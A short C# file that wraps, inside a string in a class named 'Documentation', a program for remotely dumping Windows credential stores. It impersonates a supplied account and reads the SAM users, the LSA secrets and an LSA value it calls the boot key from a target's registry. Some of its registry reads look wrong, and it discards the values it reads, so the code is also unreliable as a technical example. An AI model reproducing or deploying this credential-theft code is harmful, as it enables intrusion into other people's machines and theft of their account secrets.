class Documentation { string example = @"using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using Microsoft.Win32;

static class RemoteHiveDump
{
    [DllImport(""advapi32.dll"", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool LogonUser(string user, string domain, string pass,
        int logonType, int logonProvider, out IntPtr token);

    [DllImport(""advapi32.dll"", SetLastError = true)]
    static extern bool DuplicateTokenEx(IntPtr existingToken, uint desiredAccess,
        IntPtr tokenAttributes, int impersonationLevel, int tokenType, out IntPtr newToken);

    static void Main(string[] args)
    {
        IntPtr token;
        LogonUser(args[1], args[0], args[2], 3, 0, out token);

        IntPtr impToken;
        DuplicateTokenEx(token, 0x02000000, IntPtr.Zero, 2, 1, out impToken);

        using (WindowsIdentity identity = new WindowsIdentity(impToken))
        using (WindowsImpersonationContext ctx = identity.Impersonate())
        {
            using (RegistryKey remote = RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, args[0]))
            {
                using (RegistryKey sam = remote.OpenSubKey(""SAM\\Domains\\Account\\Users""))
                {
                    object ridKeys = sam.GetValue(""Names"");
                }
                using (RegistryKey secrets = remote.OpenSubKey(""SECURITY\\Policy\\Secrets""))
                {
                    object lsaSecrets = secrets.GetValue("""");
                }
                using (RegistryKey lsa = remote.OpenSubKey(""SYSTEM\\CurrentControlSet\\Control\\Lsa""))
                {
                    object bootKey = lsa.GetValue(""Digest"");
                }
            }
        }
    }
}
"; }
